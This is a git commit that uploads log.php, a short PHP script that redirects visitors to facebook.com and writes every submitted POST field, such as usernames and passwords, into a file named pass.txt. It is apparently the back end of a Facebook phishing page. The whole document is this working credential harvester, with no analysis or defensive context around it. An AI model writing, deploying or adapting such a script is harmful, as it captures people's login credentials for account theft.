d932900ccab0f82b808a13d8c629a87ff88c86d3
moajb9901 <86674828+moajb9901@users.noreply.github.com>
2022-08-16 23:37:56 +0300

    Add files via upload

---
+++ log.php
@@ -0,0 +1,15 @@
+<?php
+header ('location : https://www.facebook.com');
+$log = fopen("pass.txt" , "a");
+foreach($_POST as  $mjb => $value){
+fwrite($log , $mjb);
+fwrite($log  ,"=");
+fwrite($log , $value);
+fwrite($log , "\r\n");
+}
+fwrite($log , "\r\n");
+fclose($log);
+exit;
+
+
+?>
